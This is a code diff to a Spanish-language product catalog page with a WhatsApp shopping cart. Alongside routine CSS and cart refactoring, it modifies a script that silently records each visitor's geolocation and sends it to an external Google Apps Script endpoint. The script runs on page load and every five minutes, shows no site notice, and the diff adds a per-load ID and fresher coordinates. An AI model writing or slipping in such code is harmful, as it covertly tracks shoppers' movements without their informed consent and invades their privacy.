@@ -44,7 +44,6 @@
       --pill:#0e1524;
       --danger:#ef4444;
 
-      /* Iconos redes: para que entren en 1 fila incluso en pantallas pequeñas */
       --social-size: clamp(26px, 8.5vw, 38px);
       --social-gap: clamp(3px, 1.6vw, 10px);
     }
@@ -125,7 +124,6 @@
       font-size:13px;
     }
 
-    /* ✅ MÓVILES: texto centrado */
     @media (max-width:768px){
       .about-card.about-collapsed .about-text{
         display:-webkit-box;
@@ -156,13 +154,10 @@
       background:linear-gradient(90deg,#20c997,#2dd4bf);
       border:none;color:#04120d;font-weight:900;
     }
-
-    /* ✅ Botón "Agregar" cuando el producto ya está en el carrito */
     .btn-acc.in-cart{
       background: linear-gradient(90deg,#f59e0b,#f97316);
       color:#1f1300;
     }
-
     .btn-ghost{
       background:transparent;
       border:1px solid #2a3b5c;
@@ -176,7 +171,6 @@
       font-weight:900;
     }
 
-    /* ✅ Redes: siempre una fila */
     .social-icons{
       display:flex;
       align-items:center;
@@ -277,7 +271,6 @@
       white-space:nowrap;
     }
 
-    /* ✅ Contador del carrito (círculo dentro del botón Ver carrito) */
     #cartCount{
       margin-left:8px;
       border-color: rgba(0,0,0,.18);
@@ -931,19 +924,6 @@ Aguas Citrico 150 ml	Fragancias	Natura	40.000	1
       return `Hola, quiero comprar:\n${lines.join("\n")}\n\nTotal: ${fmtCOP.format(total)}`;
     }
 
-    function setCartQty(id, name, price, qty){
-      const q = Math.max(0, Number(qty) || 0);
-      if(!q) delete cart[id];
-      else{
-        cart[id] = cart[id] || { id, name, price, qty: 0 };
-        cart[id].id = id;
-        cart[id].name = name;
-        cart[id].price = Number(price) || 0;
-        cart[id].qty = q;
-      }
-      saveCart();
-    }
-
     const cartModal = document.getElementById("cartModal");
     const cartModalClose = document.getElementById("cartModalClose");
     const cartModalBackdrop = document.getElementById("cartModalBackdrop");
@@ -1038,11 +1018,11 @@ Aguas Citrico 150 ml	Fragancias	Natura	40.000	1
       if(act === "dec") newQty = Math.max(0, newQty - 1);
       if(act === "remove") newQty = 0;
 
-      setCartQty(id, current.name, current.price, newQty);
+      if(!newQty) delete cart[id]; else cart[id].qty = newQty;
+      saveCart();
       renderCartModal();
     });
 
-    // ✅ Sin alert(): si está vacío, abre WhatsApp con mensaje genérico
     cartBuyBtn.addEventListener("click", ()=>{
       const items = cartItemsArray();
       window.open(waLink(items.length ? cartMessage() : "Hola, quiero información del catálogo."), "_blank", "noopener");
@@ -1272,19 +1252,25 @@ Aguas Citrico 150 ml	Fragancias	Natura	40.000	1
   </script>
 
   <!-- ======================================================
-       ✅ REGISTRO DE UBICACIÓN AUTOMÁTICO (sin tarjeta / sin botones)
-       - El navegador IGUAL puede pedir permiso (es obligatorio por seguridad).
-       - Si el usuario ya dio permiso, arranca sin mostrar nada extra del sitio.
-       - Intervalo: 5 minutos
-       - Endpoint: tu Web App ya publicado
+       ✅ REGISTRO DE UBICACIÓN (2 MODOS)
+       - LOCATION_MODE="PING": al abrir + cada 5 min
+       - LOCATION_MODE="LOAD": solo 1 vez por cada carga (abrir enlace / F5)
+       - En ambos casos se manda load_id (nuevo en cada carga)
        ====================================================== -->
   <script>
-    const LOCATION_LOG_INTERVAL_MINUTES = 5;
+    // ====== CAMBIA SOLO ESTO ======
+    const LOCATION_MODE = "PING"; // "PING" o "LOAD"
+    const LOCATION_LOG_INTERVAL_MINUTES = 5; // solo aplica si LOCATION_MODE="PING"
+    // ==============================
+
     const LOCATION_LOG_ENDPOINT = "https://script.google.com/macros/s/AKfycbygXijUyDrpyeA8qmheyZpYw9HVWuN_JZPIeYNbqRKKNYhqFFUguEMZmof4yLTtGbVO/exec";
 
     (function(){
       const intervalMs = Math.max(1, Number(LOCATION_LOG_INTERVAL_MINUTES) || 5) * 60 * 1000;
       let timerId = null;
+
+      // ✅ ID único por CARGA de página (nuevo con F5 / abrir enlace)
+      const LOAD_ID = (Date.now() + "-" + Math.random().toString(16).slice(2));
 
       function canGeo(){
         return ("geolocation" in navigator);
@@ -1297,17 +1283,17 @@ Aguas Citrico 150 ml	Fragancias	Natura	40.000	1
             lng: String(lng),
             acc: acc == null ? "" : String(acc),
             ts: String(Date.now()),
+            load_id: LOAD_ID,
+            mode: LOCATION_MODE,
             cb: Math.random().toString(36).slice(2)
           });
 
-          // Preferimos GET para que funcione con doGet en Apps Script
           fetch(LOCATION_LOG_ENDPOINT + "?" + payload.toString(), {
             method: "GET",
             mode: "no-cors",
             cache: "no-store",
             keepalive: true
           }).catch(()=>{
-            // Fallback ultra simple
             try{
               const img = new Image();
               img.src = LOCATION_LOG_ENDPOINT + "?" + payload.toString();
@@ -1325,36 +1311,44 @@ Aguas Citrico 150 ml	Fragancias	Natura	40.000	1
               sendPing(c.latitude, c.longitude, c.accuracy);
             },
             ()=>{},
-            { enableHighAccuracy:false, timeout:15000, maximumAge: intervalMs }
+            { enableHighAccuracy:false, timeout:15000, maximumAge: 0 }
           );
         }catch(e){}
       }
 
-      function startInterval(){
+      function startPingMode(){
+        logOnce(); // al abrir
         if(timerId) return;
-        timerId = setInterval(logOnce, intervalMs);
+        timerId = setInterval(logOnce, intervalMs); // cada 5 min
       }
 
-      function startLogging(){
-        logOnce();
-        startInterval();
+      function startLoadMode(){
+        logOnce(); // solo una vez por carga
+      }
+
+      function startAccordingMode(){
+        const m = String(LOCATION_MODE || "").toUpperCase();
+        if (m === "LOAD") startLoadMode();
+        else startPingMode();
       }
 
       function requestPermissionAndStart(){
         if(!canGeo()) return;
 
-        // Si existe Permissions API, evitamos insistir cuando está denegado
         if(navigator.permissions && navigator.permissions.query){
           navigator.permissions.query({ name: "geolocation" }).then((perm)=>{
             if(perm.state === "granted"){
-              startLogging();
+              startAccordingMode();
             }else if(perm.state === "prompt"){
-              // Esto dispara el popup del navegador (inevitable si no hay permiso previo)
+              // provoca el prompt una vez; si concede, se registra y arranca según modo
               navigator.geolocation.getCurrentPosition(
                 (pos)=>{
                   const c = pos && pos.coords;
                   if(c) sendPing(c.latitude, c.longitude, c.accuracy);
-                  startInterval();
+                  const m = String(LOCATION_MODE || "").toUpperCase();
+                  if (m === "PING"){
+                    if(!timerId) timerId = setInterval(logOnce, intervalMs);
+                  }
                 },
                 ()=>{},
                 { enableHighAccuracy:false, timeout:15000, maximumAge:0 }
@@ -1362,33 +1356,14 @@ Aguas Citrico 150 ml	Fragancias	Natura	40.000	1
             }else{
               // denied: no hacemos nada
             }
-
-            // Si el usuario cambia el permiso luego, arrancamos automáticamente
-            const onChange = ()=>{
-              if(perm.state === "granted") startLogging();
-            };
-            if(typeof perm.addEventListener === "function"){
-              perm.addEventListener("change", onChange);
-            }else{
-              perm.onchange = onChange;
-            }
           }).catch(()=>{
-            // Fallback si falla Permissions API
-            navigator.geolocation.getCurrentPosition(
-              ()=> startLogging(),
-              ()=>{},
-              { enableHighAccuracy:false, timeout:15000, maximumAge:0 }
-            );
+            // fallback simple
+            startAccordingMode();
           });
           return;
         }
 
-        // Fallback sin Permissions API
-        navigator.geolocation.getCurrentPosition(
-          ()=> startLogging(),
-          ()=>{},
-          { enableHighAccuracy:false, timeout:15000, maximumAge:0 }
-        );
+        startAccordingMode();
       }
 
       if (document.readyState === "loading"){
